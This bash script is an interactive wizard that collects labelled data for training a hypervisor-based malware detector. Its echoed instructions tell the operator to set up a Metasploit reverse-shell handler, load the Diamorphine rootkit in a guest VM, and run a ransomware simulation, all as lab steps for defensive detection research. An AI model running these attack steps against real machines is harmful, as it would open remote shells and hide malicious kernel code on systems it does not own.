#!/usr/bin/env bash
# collect_for_training/scripts/collect_all_labels.sh
#
# Interactive collection wizard — walks through each label one by one.
#
# Usage:
#   ./collect_for_training/scripts/collect_all_labels.sh [VM] [DURATION_SEC] [INTERVAL_MS]
#
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
cd "$REPO_ROOT"

VM="${1:-hyptcn-guest}"
DURATION="${2:-120}"
INTERVAL="${3:-200}"

[ ! -f "bin/hyptcn" ] && make

SYSMAP_FLAG=()
[ -f "configs/hyptcn-guest.sysmap" ] && SYSMAP_FLAG=(--sysmap configs/hyptcn-guest.sysmap)

# ── Start Python analyzer ──────────────────────────────────────────────────────
ANALYZER_PID=""
if ! pgrep -f "python.*analyzer.py" > /dev/null 2>&1; then
    cd python
    ../".venv/bin/python" analyzer.py --socket /tmp/hyptcn.sock &
    ANALYZER_PID=$!
    cd "$REPO_ROOT"
    sleep 2
    echo "[wizard] Python analyzer started (PID $ANALYZER_PID)"
fi
cleanup() {
    [ -n "$ANALYZER_PID" ] && kill "$ANALYZER_PID" 2>/dev/null || true
}
trap cleanup EXIT

# ── Label wizard ───────────────────────────────────────────────────────────────
for LABEL in normal shellcode rootkit cryptominer ransomware; do
    echo ""
    echo "========================================"
    echo " Ready to collect: $LABEL"
    echo " VM=$VM  duration=${DURATION}s  interval=${INTERVAL}ms"
    echo "========================================"
    echo " Instructions:"
    case "$LABEL" in
        normal)
            echo "   Let the VM idle or perform normal browsing/work."
            echo "   No special setup required."
            ;;
        shellcode)
            echo "   Inject shellcode via msfconsole (run on host):"
            echo "     use exploit/multi/handler"
            echo "     set PAYLOAD linux/x64/shell_reverse_tcp"
            echo "     set LHOST <your-ip>  set LPORT 4444"
            echo "     exploit -j"
            ;;
        rootkit)
            echo "   Load Diamorphine rootkit in guest:"
            echo "     virsh console $VM"
            echo "     # In guest:"
            echo "     insmod /tmp/Diamorphine/diamorphine.ko"
            ;;
        cryptominer)
            echo "   Run mining workload in guest:"
            echo "     virsh qemu-agent-command $VM '{...}'"
            echo "   Or SSH into guest and run:"
            echo "     stress-ng --cpu 2 --vm 1 --vm-bytes 256M --timeout ${DURATION}s &"
            ;;
        ransomware)
            echo "   Run file-encryption simulation in guest:"
            echo "     python3 /tmp/ransomware-sim.py --target /tmp/testfiles/ &"
            echo "   (creates encrypted copies and simulates C2 traffic)"
            ;;
    esac
    echo ""

    read -r -p "Press ENTER to start collecting '$LABEL' (Ctrl+C to skip this label)..." || {
        echo ""
        echo "[wizard] Skipping $LABEL"
        continue
    }

    echo "[wizard] Collecting $LABEL for ${DURATION}s..."
    ./bin/hyptcn \
        --vm "$VM" \
        --interval "$INTERVAL" \
        --collect \
        --collect-label "$LABEL" \
        --collect-duration "$DURATION" \
        --collect-dir collect_for_training/ \
        "${SYSMAP_FLAG[@]+"${SYSMAP_FLAG[@]}"}" || true

    COUNT=$(find "collect_for_training/$LABEL/" -name '*.bin' 2>/dev/null | wc -l)
    echo "[wizard] Collected $COUNT total frames for $LABEL"
    echo ""
done

echo "========================================"
echo " Collection complete. Summary:"
bash "$SCRIPT_DIR/dataset_stats.sh"
echo ""
echo " Next step:  ./collect_for_training/scripts/quick_train.sh"
